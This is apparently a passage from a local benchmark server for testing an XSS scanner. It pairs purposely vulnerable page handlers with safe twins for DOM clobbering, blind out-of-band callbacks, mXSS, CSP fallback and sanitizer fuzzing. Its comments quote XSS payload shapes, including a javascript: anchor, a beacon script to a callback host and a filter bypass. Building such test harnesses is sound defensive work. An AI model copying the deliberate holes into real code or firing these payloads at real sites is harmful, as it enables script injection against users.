    body_val = (ctx.get("fields") or {}).get("q", "")
    if _waf_blocked(body_val,
                    ["re:" + p for p in _WAF_STRICT_PATTERNS]):
        return (406, {**_WAF_HEADERS,
                      "Content-Type": "text/html; charset=utf-8"},
                _WAF_BLOCK_PAGE)
    query_val = ((ctx.get("query") or {}).get("q") or [""])[0]
    return _pshift_render(body_val, query_val, escape_query=True)

# ---------------------------------------------------------------------------
# Phase 123: DOM clobbering targets (L7_dom_clobber).
#
# _scan_dom_clobber injects
#   <a id={token} name={token} href="javascript:alert(1)">x</a>
# and asks three things at once: (1) id=<token> landed as a REAL attribute
# (detect_reflection), (2) the page's own JS consumes an element reference
# (getElementById(...) / querySelector('#...') / document.<name>), and
# (3) a dangerous sink is present.  So the target has to be raw HTML
# reflection AND a JS reference AND a sink, on the same page.
#
# The safe twin CANNOT be "escape the parameter": html.escape() leaves
# "id=<token>" textually intact (only the angle brackets change), and
# detect_reflection's `(?:id|name)\s*=\s*TOKEN` regex still matches.  What
# actually removes the premise is taking away the ability to CREATE an
# attribute -- hence a strip-tags sanitizer.  Same page, same script, same
# sink; only attacker-created attributes disappear.
# ---------------------------------------------------------------------------

_STRIP_TAGS_RE = re.compile(r"<[^>]*>")

# getElementById('cfg') -> js ref; `download.href = ...` -> sink.
# The sink is deliberately NOT innerHTML/outerHTML/document.write: those
# put the page in the Trusted Types layer's line of fire, which then
# reports `trusted_types_no_policy` (medium) on the SAFE twin and trips
# the zero-finding gate.  A clobbered value flowing into a link href is
# equally realistic (javascript: URL lands on the target element) and does
# not drag an unrelated layer into the case.
_CLOBBER_SCRIPT = ("<script>"
                   "var cfg = document.getElementById('cfg');"
                   "var dl = document.getElementById('download');"
                   "dl.href = cfg ? cfg.textContent : '#';"
                   "</script>")


_CLOBBER_HEAD = ('<h1>Theme picker</h1>'
                 '<a id="download" href="#">Download theme</a>')


def m_clobber_vuln(v: str, ctx: dict) -> tuple:
    """Raw HTML reflection beside JS that consumes an element by id."""
    return _page(_CLOBBER_HEAD
                 + f'<div id="stage">{v}</div>'
                 + _CLOBBER_SCRIPT)


def m_clobber_safe(v: str, ctx: dict) -> tuple:
    """Same page; the value goes through a strip-tags sanitizer."""
    return _page(_CLOBBER_HEAD
                 + f'<div id="stage">{_STRIP_TAGS_RE.sub("", v or "")}</div>'
                 + _CLOBBER_SCRIPT)


def m_clobber_escaped(v: str, ctx: dict) -> tuple:
    """Same page; the value is HTML-escaped (the apparently-correct fix).

    This target exists because escaping is NOT enough for this layer:
    `id=<token>` survives `<`/`>` escaping textually, so the layer used to
    report `dom_clobber` here even though no attribute can be created --
    a false positive on every page that escapes its reflection but has a
    `getElementById` + sink script (i.e. most real apps).  See
    dom_clobber.detect_reflection (Phase 123).
    """
    return _page(_CLOBBER_HEAD
                 + f'<div id="stage">{html.escape(v or "", quote=True)}</div>'
                 + _CLOBBER_SCRIPT)


# ---------------------------------------------------------------------------
# Phase 124: blind / OOB targets (L5_blind_oob).
#
# The layer needs three things: (1) --oob <mode> so scanner.oob exists at
# all (the manifest carries it in extra_args), (2) the parameter must
# reflect an UNESCAPED executable tag (<script / <svg / <img / <iframe /
# <body ) -- _inject_blind's own gate, and (3) SOMETHING must later fetch
# the callback URL the injected payload carries.
#
# (3) is what normally needs a browser.  This target models the victim's
# resource loading without one: a link-unfurl / image-proxy style step
# resolves the src|href attributes of REAL parsed elements.  It is
# HTML-PARSER AWARE on purpose -- a regex sweep for http(s) URLs would
# also unfurl the ESCAPED safe twin (an escaped payload still contains the
# callback URL as text) and then the case would prove nothing.
# ---------------------------------------------------------------------------

_UNFURL_ATTRS = ("src", "href", "data", "poster", "action", "formaction",
                 "srcdoc")
_URL_IN_TEXT_RE = re.compile(r"https?://[^\s'\"<>]+")


class _ResourceCollector(HTMLParser):
    """Collect absolute URLs that REFLECTED MARKUP would actually resolve.

    Phase 124 note: the blind payload the engine injects is
    `<script>new Image().src='https://__OOB__/?c='+...</script>` -- the
    callback URL lives in inline SCRIPT TEXT, not in any attribute.  So the
    collector looks at three places, all of which require real markup:
      * resource-ish attributes of a real start tag,
      * event-handler attributes of a real start tag (onload=..., etc.),
      * the text content of a real <script> element.
    Plain text nodes are deliberately ignored -- that is what keeps the
    escaped twin silent (its callback URL is only ever text).
    """

    def __init__(self):
        super().__init__(convert_charrefs=True)
        self.urls: list = []
        self._open_tags: list = []

    def _harvest(self, text: str) -> None:
        if not text:
            return
        self.urls.extend(_URL_IN_TEXT_RE.findall(text))

    def handle_starttag(self, tag, attrs):
        if tag.lower() not in ("script", "style"):
            self._open_tags.append(tag.lower())
        else:
            self._open_tags.append(tag.lower())
        for name, value in attrs:
            if not value:
                continue
            low = name.lower()
            if low in _UNFURL_ATTRS or low.startswith("on"):
                self._harvest(value)
        # void elements never produce an endtag
        if tag.lower() in ("img", "input", "meta", "link", "br", "hr",
                           "source", "area", "base", "col", "embed",
                           "track", "wbr") and self._open_tags:
            self._open_tags.pop()

    def handle_endtag(self, tag):
        while self._open_tags:
            t = self._open_tags.pop()
            if t == tag.lower():
                break

    def handle_data(self, data):
        if "script" in self._open_tags or "style" in self._open_tags:
            self._harvest(data)


def _unfurl(fragment: str) -> None:
    """Best-effort resolve of resources referenced by REAL markup."""
    if not fragment:
        return
    try:
        parser = _ResourceCollector()
        parser.feed(fragment)
        urls = list(dict.fromkeys(parser.urls))[:3]
    except Exception:
        return
    for u in urls:
        try:
            urllib.request.urlopen(u, timeout=2).read(2048)
        except Exception:
            pass


def m_blind_vuln(v: str, ctx: dict) -> tuple:
    """Raw reflection + resource unfurl: the injected callback really loads."""
    _unfurl(v or "")
    return _page("<h1>Link preview</h1>"
                 f'<div id="preview">{v}</div>')


def m_blind_safe(v: str, ctx: dict) -> tuple:
    """Same page, same unfurler; the value is HTML-escaped before render.

    Escaped input produces no parsed element at all, so nothing can be
    resolved -- no beacon, no finding.
    """
    escaped = html.escape(v or "", quote=True)
    _unfurl(escaped)
    return _page("<h1>Link preview</h1>"
                 f'<div id="preview">{escaped}</div>')


# ---------------------------------------------------------------------------
# Phase 125: time-based fallback targets (L7_time_based).
#
# scan_time_based is a FALLBACK: it runs only after every standard variant
# failed verify_semantic() while the marker still reflected -- exactly the
# "strict CSP blocks alert()" case its own comment describes.  It then
# fires three resource-fetch channels (<style>@import</style>,
# <img src=x onerror=fetch(...)>, <img src=...>) carrying a fresh tb_
# token, and polls the OOB listener for it.
#
# So the target needs: (1) raw reflection, (2) a CSP that stops the
# verifier from confirming yet still lets images/CSS load -- `script-src
# 'none'`, NOT `default-src 'none'` (that would block the very resources
# this layer depends on), and (3) the Phase 124 victim simulator so the
# injected resource is really fetched.
#
# The safe twin escapes, so no element/stylesheet is parsed, nothing is
# fetched, and no token ever beacons.
# ---------------------------------------------------------------------------

_CSP_SCRIPT_NONE = {"Content-Security-Policy":
                    "script-src 'none'; object-src 'none'"}


def m_tb_vuln(v: str, ctx: dict) -> tuple:
    """Raw reflection under a script-blocking CSP + resource unfurl."""
    _unfurl(v or "")
    return _page(f'<h1>Search</h1><div id="results">{v}</div>',
                 _CSP_SCRIPT_NONE)


def m_tb_safe(v: str, ctx: dict) -> tuple:
    """Same CSP and unfurler; the value is escaped, so nothing resolves."""
    escaped = html.escape(v or "", quote=True)
    _unfurl(escaped)
    return _page(f'<h1>Search</h1><div id="results">{escaped}</div>',
                 _CSP_SCRIPT_NONE)


MODES_CTX.update({
    "pm_vuln": m_pm_vuln,
    "pm_safe": m_pm_safe,
})

PAGE_MODES.update({
    "cssi_vuln": m_cssi_vuln,
    "cssi_safe": m_cssi_safe,
    "cssi_gfonts_safe": m_cssi_gfonts_safe,
    "pe_vuln": m_pe_vuln,
    "pe_safe": m_pe_safe,
    "clobber_vuln": m_clobber_vuln,
    "clobber_safe": m_clobber_safe,
    "clobber_escaped": m_clobber_escaped,
    "blind_vuln": m_blind_vuln,
    "blind_safe": m_blind_safe,
    "tb_vuln": m_tb_vuln,
    "tb_safe": m_tb_safe,
})

# ---------------------------------------------------------------------------
# Phase 128b: mXSS targets (L7_mutation).
#
# The layer fires when the injected mXSS payload survives into the response
# VERBATIM *and* the page carries a mutating sink in a script/handler region
# (mutation.has_mutating_sink only searches <script> blocks and on*=
# handlers).  So the page is a "markdown preview" that reflects the value
# raw and then parses/serialises a string -- exactly the flow that lets
# inert markup become executable.
#
# The sink is deliberately DOMParser + parseFromString, NOT innerHTML:
# innerHTML/outerHTML/insertAdjacentHTML/document.write are on the Trusted
# Types layer's list, so a page using them makes the SAFE twin emit
# `trusted_types_no_policy` (medium) and the zero-finding gate goes red for
# a completely correct case (learned in Phase 123).  DOMParser is a real
# mutation vehicle and is not on that list.
#
# The safe twin escapes, so the payload never survives verbatim and
# mutation.detect_reflection() is False -- the premise is genuinely gone.
# ---------------------------------------------------------------------------

_MXSS_REPARSE_SCRIPT = (
    "<script>"
    "var doc = new DOMParser().parseFromString("
    "document.getElementById('stage').textContent, 'text/html');"
    "document.getElementById('out').textContent = doc.body.textContent;"
    "</script>")


def m_mx_vuln(v: str, ctx: dict) -> tuple:
    return _page('<h1>Markdown preview</h1>'
                 f'<div id="stage">{v}</div><div id="out"></div>'
                 + _MXSS_REPARSE_SCRIPT)


def m_mx_safe(v: str, ctx: dict) -> tuple:
    return _page('<h1>Markdown preview</h1>'
                 f'<div id="stage">{html.escape(v or "", quote=True)}</div>'
                 '<div id="out"></div>'
                 + _MXSS_REPARSE_SCRIPT)


# ---------------------------------------------------------------------------
# Phase 128: XS-Leak surface audit targets (L7_xsleak).
#
# This layer is a response-HEADER audit behind the opt-in --audit-xs-leaks
# flag: a page that sets NO cross-origin isolation (COOP/CORP/COEP) and no
# framing restriction (X-Frame-Options / CSP frame-ancestors) leaves the
# whole no-cors / frame-timing / window.name surface open.  Partial
# hardening suppresses the note, so the pair is:
#   * vuln -> an ordinary page with no isolation headers at all
#   * safe -> the SAME page plus one hardening header
# It is an audit pair, not an exploit pair: the finding is severity
# "low"/confidence "firm" -- which is also why the zero-finding gate
# (high/medium only) cannot catch a regression here, and why the safe twin
# has to be verified with the flag actually ON.
# ---------------------------------------------------------------------------


def _isolation_page(v: str, hardened: bool) -> tuple:
    body = ('<h1>Dashboard</h1>'
            '<p>Internal reporting surface.</p>')
    if not hardened:
        return _page(body)
    return _page(body, {"X-Frame-Options": "DENY"})


def m_xs_vuln(v: str, ctx: dict) -> tuple:
    return _isolation_page(v, hardened=False)


def m_xs_safe(v: str, ctx: dict) -> tuple:
    return _isolation_page(v, hardened=True)


POST_MODES.update({
    "pshift_vuln": m_pshift_vuln,
    "pshift_safe": m_pshift_safe,
    # Phase 126: second-order pairs REUSE the stored machinery (inject at A
    # stores, the B page renders) but under their own mode names, so the
    # manifest says which capability a case exercises and the coverage
    # matrix can tell L4_stored and L4_second_order apart.  What makes it
    # second-order is the CLI flow (inject at A, verify a DIFFERENT page B),
    # not the handler.
    "so2_write": m_stored_write,
    "so2_write_escaped": m_stored_write_escaped,
    # NOTE for future phases: the viewer belongs in POST_MODES, not
    # PAGE_MODES.  The GET dispatcher resolves a ctx-aware handler via
    # `MODES_CTX.get(mode) or POST_MODES.get(mode)` and only falls back to
    # PAGE_MODES with an EMPTY ctx -- and a viewer with no ctx["path"]
    # cannot resolve VIEW_TO_INJECT, so it renders an empty store.  (That
    # is how stored_view has always worked.)
    "so2_view": m_stored_view,
    # Phase 127: scenario-driven twins (L9_scenario).  Same two-page shape;
    # what the scenario file adds is the DECLARATIVE multi-step recipe
    # (POST /inject -> GET /view), so the finding carries type "scenario"
    # and the flow is driven by data, not by a dedicated CLI flag.
    "sc_write": m_stored_write,
    "sc_write_escaped": m_stored_write_escaped,
    "sc_view": m_stored_view,
    # Phase 128b: mXSS pair (no ctx needed).
    "mx_vuln": m_mx_vuln,
    "mx_safe": m_mx_safe,
    # Phase 128: no ctx needed -- the audit only looks at response headers.
    "xs_vuln": m_xs_vuln,
    "xs_safe": m_xs_safe,
})


PAGE_MODES.update({
    "crawl_form_vuln": m_crawl_form_vuln,
    "crawl_form_safe": m_crawl_form_safe,
    "crawl_js_vuln": m_crawl_js_vuln,
    "crawl_js_safe": m_crawl_js_safe,
    "formecho_raw": m_formecho_raw,
    "formecho_safe": m_formecho_safe,
})

MODES: dict[str, callable] = {
    # Vulnerable: raw reflection
    "raw_element": m_raw_element,
    "raw_element_table": m_raw_element_table,
    "raw_element_nested": m_raw_element_nested,
    "raw_element_span": m_raw_element_span,
    "raw_element_li": m_raw_element_li,
    "raw_element_embed": m_raw_element_embed,
    "raw_element_form": m_raw_element_form,
    "raw_element_input": m_raw_element_input,
    "raw_element_select": m_raw_element_select,
    "raw_element_details": m_raw_element_details,
    "raw_element_video": m_raw_element_video,
    "raw_element_marquee": m_raw_element_marquee,
    "raw_element_audio": m_raw_element_audio,
    "raw_element_a": m_raw_element_a,
    "raw_element_div_tabindex": m_raw_element_div_tabindex,
    "raw_element_body": m_raw_element_body,
    "raw_attr_dq": m_raw_attr_dq,
    "raw_attr_sq": m_raw_attr_sq,
    "raw_attr_nq": m_raw_attr_nq,
    "raw_attr_dq_href": m_raw_attr_dq_href,
    "raw_attr_dq_src": m_raw_attr_dq_src,
    "raw_attr_dq_action": m_raw_attr_dq_action,
    "raw_attr_dq_event": m_raw_attr_dq_event,
    "raw_attr_dq_style": m_raw_attr_dq_style,
    "raw_attr_dq_formaction": m_raw_attr_dq_formaction,
    "raw_attr_dq_data": m_raw_attr_dq_data,
    "raw_script_string_dq": m_raw_script_string_dq,
    "raw_script_string_sq": m_raw_script_string_sq,
    "raw_script_block": m_raw_script_block,
    "raw_script_template": m_raw_script_template,
    "raw_script_comment": m_raw_script_comment,
    "raw_script_close": m_raw_script_close,
    "raw_svg": m_raw_svg,
    "raw_svg_attr": m_raw_svg_attr,
    "raw_svg_onload": m_raw_svg_onload,
    "raw_svg_animate": m_raw_svg_animate,
    "raw_svg_foreignobject": m_raw_svg_foreignobject,
    "raw_math": m_raw_math,
    "raw_math_href": m_raw_math_href,
    "raw_href_js": m_raw_href_js,
    "raw_href_data": m_raw_href_data,
    "raw_meta_refresh": m_raw_meta_refresh,
    "escape_meta_refresh_js": m_escape_meta_refresh_js,
    "raw_iframe_src": m_raw_iframe_src,
    "raw_iframe_srcdoc": m_raw_iframe_srcdoc,
    "raw_base_href": m_raw_base_href,
    "raw_style_block": m_raw_style_block,
    "raw_comment": m_raw_comment,
    "raw_cdata": m_raw_cdata,
    "raw_template": m_raw_template,
    "raw_template_vue": m_raw_template_vue,
    "raw_url_decode": m_raw_url_decode,
    "raw_double_decode": m_raw_double_decode,
    # DOM-based
    "dom_hash_innerhtml": m_dom_hash_innerhtml,
    "dom_hash_route_innerhtml": m_dom_hash_route_innerhtml,
    "dom_hash_route_safe": m_dom_hash_route_safe,
    "dom_tt_wrapper_innerhtml": m_dom_tt_wrapper_innerhtml,
    "dom_tt_wrapper_safe": m_dom_tt_wrapper_safe,
    "dom_search_eval": m_dom_search_eval,
    "dom_postmessage": m_dom_postmessage,
    "dom_hash_docwrite": m_dom_hash_docwrite,
    "dom_jquery_html": m_dom_jquery_html,
    "dom_hash_settimeout": m_dom_hash_settimeout,
    # Safe: escaping
    "escape_element": m_escape_element,
    "escape_attr_dq": m_escape_attr_dq,
    "escape_attr_sq": m_escape_attr_sq,
    "escape_attr_nq": m_escape_attr_nq,
    "escape_script_string": m_escape_script_string,
    "escape_href": m_escape_href,
    # Safe: RCDATA
    "rcdata_textarea": m_rcdata_textarea,
    "rcdata_title": m_rcdata_title,
    "rcdata_xmp": m_rcdata_xmp,
    "rcdata_textarea_script": m_rcdata_textarea_script,
    "escape_rcdata_textarea": m_escape_rcdata_textarea,
    "escape_rcdata_title": m_escape_rcdata_title,
    "escape_rcdata_xmp": m_escape_rcdata_xmp,
    "escape_rcdata_textarea_script": m_escape_rcdata_textarea_script,
    # Safe: comment
    "comment_stripped": m_comment_stripped,
    "comment_encoded": m_comment_encoded,
    # Safe: attribute
    "attr_quotes_stripped": m_attr_quotes_stripped,
    "attr_alnum_whitelist": m_attr_alnum_whitelist,
    "attr_data_escaped": m_attr_data_escaped,
    "attr_angle_stripped": m_attr_angle_stripped,
    # Safe: CSP
    "csp_strict_element": m_csp_strict_element,
    "csp_strict_href": m_csp_strict_href,
    "csp_nonce_element": m_csp_nonce_element,
    "csp_strict_attr": m_csp_strict_attr,
    # Phase 98 shapes (nonce + unsafe-inline, multi-position reflection)
    "csp_nonce_ui_element": m_csp_nonce_ui_element,
    "csp_nonce_ui_leak": m_csp_nonce_ui_leak,
    "csp_ui_element": m_csp_ui_element,
    "multi_escaped_then_raw": m_multi_escaped_then_raw,
    "multi_textarea_then_raw": m_multi_textarea_then_raw,
    # Safe: JSONP
    "jsonp_whitelist": m_jsonp_whitelist,
    "jsonp_wrapped": m_jsonp_wrapped,
    # Safe: filtering
    "filter_script_tag": m_filter_script_tag,
    "filter_event_handlers": m_filter_event_handlers,
    "filter_javascript_uri": m_filter_javascript_uri,
    "filter_angle_brackets": m_filter_angle_brackets,
    "filter_keywords": m_filter_keywords,
    "filter_recursive_script": m_filter_recursive_script,
    # Safe: encoding
    "output_urlencoded": m_output_urlencoded,
    "output_base64": m_output_base64,
    "double_encode_safe": m_double_encode_safe,
    "case_lower_strip": m_case_lower_strip,
    # Safe: JSON
    "json_string_escaped": m_json_string_escaped,
    "json_object_value": m_json_object_value,
    # Safe: header-only
    "header_only": m_header_only,
    # Safe: JS sinks
    "js_textcontent": m_js_textcontent,
    "js_console_log": m_js_console_log,
    # Safe: misc
    "select_option_escaped": m_select_option_escaped,
    "null_byte_strip": m_null_byte_strip,
}


# ---------------------------------------------------------------------------
# Routing table (built from manifest)
# ---------------------------------------------------------------------------

# Phase 129: harness-only route (deliberately NOT a manifest case).
#
# The manifest pairs are hand-written -- one shape per layer, chosen by us.
# That is exactly the blind spot every escaping-blind false positive came
# from (Phases 123/126/128): a shape nobody wrote down.  `/fuzz/render`
# lets a GENERATOR drive the matrix instead of us: the caller picks the
# rendering CONTEXT and the ESCAPING through query params, so the
# "escaped => must not confirm" invariant can be fuzzed across contexts
# without adding a route -- and a scored case -- per combination.
# Registered here rather than in the manifest because aux cases are still
# scored, and a parameterised helper is not a vulnerability target.
# ---------------------------------------------------------------------------

_FUZZ_TEMPLATES = {
    "text": '<div class="x">{}</div>',
    "attr_dq": '<input value="{}">',
    "attr_sq": "<input value='{}'>",
    "attr_bare": "<input value={}>",
    "script_dq": '<script>var a = "{}";</script>',
    "script_sq": "<script>var a = '{}';</script>",
    "href": '<a href="{}">link</a>',
    "svg": "<svg><title>{}</title></svg>",
    "comment": "<!-- {} -->",
}

# Page-level "sinks" a real app might carry alongside the reflection.  Both
# escaping-blind layer FPs (Phase 123 dom_clobber, Phase 128 mXSS) needed
# exactly this combination: escaped reflection + a page feature the layer
# keys on.  Note `dom` uses DOMParser and NOT innerHTML -- innerHTML is on
# the Trusted Types layer's list, so it would add a legitimate medium
# finding and poison a "no findings" assertion.
_FUZZ_SINKS = {
    "none": "",
    "dom": ("<div id='o'></div><script>var d = new DOMParser()"
            ".parseFromString('x', 'text/html');"
            "document.getElementById('o').textContent = d.body.textContent;"
            "</script>"),
}


def m_fuzz_render(v: str, ctx: dict) -> tuple:
    """Render ``q`` into the requested context with the requested escaping."""
    qs = ctx.get("query") or {}
    which = (qs.get("ctx") or ["text"])[0]
    esc = (qs.get("esc") or ["raw"])[0]
    sink = (qs.get("sink") or ["none"])[0]
    tpl = _FUZZ_TEMPLATES.get(which)
    if tpl is None:
        return _page("<p>unknown ctx</p>")
    value = v or ""
    if esc in ("html", "attr"):
        value = html.escape(value, quote=True)
    elif esc == "strip_script":
        # Classic "remove <script> tags" sanitizer -- the target of the
        # recursive-strip bypass (<scr<script>ipt>).
        value = re.sub(r"</?script[^>]*>", "", value, flags=re.I)
    elif esc == "encode_angles":
        # Escape the angle brackets ONLY, leaving quotes raw: an attribute
        # break-out that needs no "<" still works.
        value = value.replace("<", "&lt;").replace(">", "&gt;")
    elif esc == "encode_quotes":
        # Mirror image of encode_angles: escape the QUOTES only, leaving
        # angle brackets raw.  Tag-shaped payloads still live in text
        # contexts; attribute break-outs (which need a quote) die.
        value = (value.replace('"', "&quot;").replace("'", "&#x27;"))
    elif esc == "strip_tags":
        # Drop every tag.  A payload whose power comes from a tag dies; one
        # that only needs a quote or a space (attribute break-out) survives.
        value = re.sub(r"<[^>]*>", "", value)
    elif esc == "strip_handlers":
        # Remove event-handler attributes only (`on...=`): the classic
        # "blacklist on* handlers" filter.  Tag payloads and javascript:
        # URIs are untouched.
        value = re.sub(r"\son\w+\s*=\s*(?:\"[^\"]*\"|'[^']*'|[^\s>]*)", "",
                       value, flags=re.I)
    elif esc == "entity_decode":
        # The app DECODES entities once before output (the double-decoding
        # bug class): an entity-encoded payload such as `&#60;script&#62;`
        # turns back into a live tag.
        value = html.unescape(value)
    elif esc == "escape_lt_only":
        # Half-hearted escaping: only "<" is escaped, ">" and quotes stay
        # raw -- attribute break-outs that need no "<" are still live, and
        # the corpus's multi-encode shapes matter here.
        value = value.replace("<", "&lt;")
    elif esc == "strip_script_recursive":
        # The hardened version of `strip_script`: keep stripping until no
        # script tag is left, so the recursive-strip bypass
        # (<scr<script>ipt>) does NOT work here.
        while re.search(r"</?script", value, re.I):
            new = re.sub(r"</?script[^>]*>", "", value, flags=re.I)
            if new == value:
                break
            value = new
    return _page(tpl.replace("{}", value) + _FUZZ_SINKS.get(sink, ""))


EXTRA_ROUTES: dict = {
    "/fuzz/render": {"path": "/fuzz/render", "param": "q",
                     "mode": "fuzz_render"},
}

# Registered here (not with the other mode tables up top) because the
# handler above must exist first.  MODES_CTX is the ctx-aware registry the
# GET dispatcher consults -- m_fuzz_render reads ctx["query"].
MODES_CTX.update({"fuzz_render": m_fuzz_render})


def _request_path(path: str) -> str:
    """The path a client actually requests for a manifest ``path``.

    Phase 146: a case may carry its payload behind a fragment
    (``/dom/hash-route#/route``), because that is where an SPA router keeps
    its parameters.  An HTTP request never includes the fragment, so the
    server only ever sees the part before the ``#`` -- registering the raw
    string made such cases 404.  The fragment still reaches the DOM engine,
    which is the only layer that can use it.
    """
    return path.split("#", 1)[0] or "/"


def load_routes() -> dict[str, dict]:
    """Load manifest and build path -> case routing table."""
    with open(_MANIFEST_PATH, "r", encoding="utf-8") as f:
        manifest = json.load(f)
    routes = {}
    for case in manifest["cases"]:
        routes[_request_path(case["path"])] = case
        # Three capabilities need a RENDERER page that is not a manifest
        # case of its own.  Each gets its own manifest key so the flows stay
        # independent (e.g. view_path also wires --stored-inject, which a
        # second-order or scenario case does not want).
        for key, default_mode in (
                ("view_path", "stored_view"),              # Phase 110
                ("second_order_view_path", "so2_view"),    # Phase 126
                ("scenario_view_path", "sc_view"),         # Phase 127
        ):
            _register_viewer(routes, case, key, default_mode)
        # Phase 152: SPA-shaped stored cases expose their client-fetched
        # data as a JSON list endpoint next to the write endpoint.
        if case.get("list_path"):
            routes.setdefault(case["list_path"],
                              dict(case, mode="stored_api_list"))
    # Phase 129: harness-only routes (never scored).  setdefault so a real
    # manifest case with the same path would win.
    for path, extra in EXTRA_ROUTES.items():
        routes.setdefault(path, dict(extra))
    return routes


_VIEW_MODE_KEY = {
    "view_path": "view_mode",
    "second_order_view_path": "second_order_view_mode",
    "scenario_view_path": "scenario_view_mode",
}


def _register_viewer(routes: dict, case: dict, key: str,
                     default_mode: str) -> None:
    """Register a renderer page for ``case`` under manifest key ``key``."""
    view = case.get(key)
    if not view:
        return
    VIEW_TO_INJECT[view] = case["path"]
    # Manifest key -> the key naming the override mode.  Mapping them
    # explicitly matters: deriving it as key.replace("_view_path", "_view_mode")
    # silently no-ops for "view_path" (no leading underscore) and the route
    # then carries the PATH as its mode.
    mode_key = _VIEW_MODE_KEY[key]
    routes.setdefault(view, dict(case, mode=case.get(mode_key, default_mode)))


# ---------------------------------------------------------------------------
# HTTP Handler
# ---------------------------------------------------------------------------

class BenchmarkHandler(BaseHTTPRequestHandler):
    # HTTP/1.1 keep-alive: without it every scan request
    # leaves a TIME_WAIT client socket, and a multi-thousand-
    # request benchmark run exhausts Windows ephemeral ports
    # (connects then stall with zero CPU).  Responses all set
    # Content-Length, which HTTP/1.1 requires.
    protocol_version = "HTTP/1.1"
    routes: dict[str, dict] = {}

    # HTTPServer accepts one connection at a time, and a client that is killed
    # mid-run (the runner's `subprocess.run(timeout=60)` does exactly that)
    # leaves its keep-alive socket open.  With the default `timeout = None` the
    # accept loop then sits in `readinto` forever and every later case "times
    # out" -- the reason a full 185-case run never returned.  Measured with
    # faulthandler: server thread in socket.py:704 readinto, 0.2 CPU-s in 20 min.
    timeout = 5

    def do_GET(self):
        parsed = urlparse(self.path)
        path = parsed.path

        # Health check
        if path == "/health":
            self._respond(200, {"Content-Type": "text/plain"}, "ok")
            return

        case = self.routes.get(path)
        if case is None:
            # Phase 109: prefix routes (manifest path ending in '*') exist
            # for vector families that inject into a URL PATH SEGMENT --
            # the scanner appends its payload as a new last segment, so an
            # exact match can never hit.
            for pfx, pc in self.routes.items():
                if pfx.endswith("*") and path.startswith(pfx[:-1]):
                    case = pc
                    break
        if case is None:
            # Deliberately SAFE: the requested path is NOT echoed here.
            # Only the registered prefix routes (/r/err01/*, /r/pth01/*)
            # reflect it -- if this fallback echoed too, EVERY case would
            # pick up a bonus path_xss/error_page_xss finding and the
            # benchmark matrix would be noise.
            self._respond(
                404, {"Content-Type": "text/html; charset=utf-8"},
                "<!DOCTYPE html><html><head><title>bench</title></head>"
                "<body><h1>404 - Not Found</h1><p>No such resource.</p>"
                "</body></html>")
            return

        mode = case["mode"]
        param = case.get("param", "q")
        ctx_handler = MODES_CTX.get(mode) or POST_MODES.get(mode)
        handler = MODES.get(mode) if ctx_handler is None else None
        if ctx_handler is None and handler is None and mode in PAGE_MODES:
            page_fn = PAGE_MODES[mode]
            handler = lambda v, _h=page_fn: _h(v, {})  # noqa: E731
        if ctx_handler is None and handler is None:
            self._respond(500, {"Content-Type": "text/plain"}, f"unknown mode: {mode}")
            return

        # Extract parameter value from query string
        qs = parse_qs(parsed.query, keep_blank_values=True)
        value = qs.get(param, ["test"])[0] if param else ""

        try:
            if ctx_handler is not None:
                context = {
                    "headers": dict(self.headers),
                    "path": path,
                    "query": qs,
                    "method": "GET",
                }
                status, headers, body = ctx_handler(value, context)
            else:
                status, headers, body = handler(value)
        except Exception as e:
            self._respond(500, {"Content-Type": "text/plain"}, f"mode error: {e}")
            return

        self._respond(status, headers, body)



    def do_POST(self):
        """POST endpoints: stored writes/views, multipart uploads, JSON echo.

        The store lives in process memory keyed by the INJECT path, so a
        later GET of a registered view path renders what was written --
        that is the whole shape of stored XSS.
        """
        parsed = urlparse(self.path)
        path = parsed.path
        case = self.routes.get(path)
        if case is None:
            for pfx, pc in self.routes.items():
                if pfx.endswith("*") and path.startswith(pfx[:-1]):
                    case = pc
                    break
        if case is None:
            self._respond(404, {"Content-Type": "text/html; charset=utf-8"},
                          "<!DOCTYPE html><html><body><h1>404</h1>"
                          "<p>No such resource.</p></body></html>")
            return
        mode = case["mode"]
        handler = POST_MODES.get(mode)
        if handler is None:
            self._respond(405, {"Content-Type": "text/plain"},
                          f"mode {mode} is not a POST endpoint")
            return
        length = int(self.headers.get("Content-Length") or 0)
        body = self.rfile.read(length) if length > 0 else b""
        fields, files = _parse_post_body(self.headers.get("Content-Type"), body)
        field = case.get("param", "q")
        value = fields.get(field, files.get(field, ""))
        context = {
            "headers": dict(self.headers),
            "path": path,
            "fields": fields,
            "files": files,
            "field": case.get("upload_field") or field,
            # Phase 122: query dict for handlers that need BOTH locations
            # (position-shift: WAF guards the body, the query is the gap).
            "query": parse_qs(parsed.query, keep_blank_values=True),
            "method": "POST",
        }
        try:
            status, headers, out = handler(value, context)
        except Exception as e:
            self._respond(500, {"Content-Type": "text/plain"},
                          f"mode error: {e}")
            return
        self._respond(status, headers, out)

    def _respond(self, status: int, headers: dict, body: str):
        self.send_response(status)
        for k, v in headers.items():
            self.send_header(k, v)
        self.send_header("Content-Length", str(len(body.encode("utf-8"))))
        self.end_headers()
        self.wfile.write(body.encode("utf-8"))

    def log_message(self, format, *args):
        # Suppress request logging to keep output clean
        pass


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def run_server(port: int = DEFAULT_PORT, ready_callback=None):
    """Start the benchmark server and serve until shutdown().

    The ready_callback (if given) is invoked once the socket is listening;
    it must NOT call serve_forever() itself — this function always enters
    the accept loop right after the callback returns.
    """
    routes = load_routes()
    BenchmarkHandler.routes = routes

    # Threading, not HTTPServer: an abandoned client connection (the runner
    # kills a scanner subprocess on its per-case timeout, which leaves the
    # socket half-open) holds a single-threaded accept loop until `timeout`
    # expires.  Measured: next request 5.01s behind one abandoned connection
    # with HTTPServer, 0.01s with ThreadingHTTPServer.  Every other probe that
    # serves this handler already uses ThreadingHTTPServer.
    server = ThreadingHTTPServer(("127.0.0.1", port), BenchmarkHandler)
    print(f"[*] Benchmark server on http://127.0.0.1:{port} "
          f"({len(routes)} endpoints, {len(MODES)} modes)")

    if ready_callback:
        ready_callback(server)
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        pass
    finally:
        server.server_close()
    return server


if __name__ == "__main__":
    port = DEFAULT_PORT
    if "--port" in sys.argv:
        idx = sys.argv.index("--port")
        if idx + 1 < len(sys.argv):
            port = int(sys.argv[idx + 1])
    run_server(port)
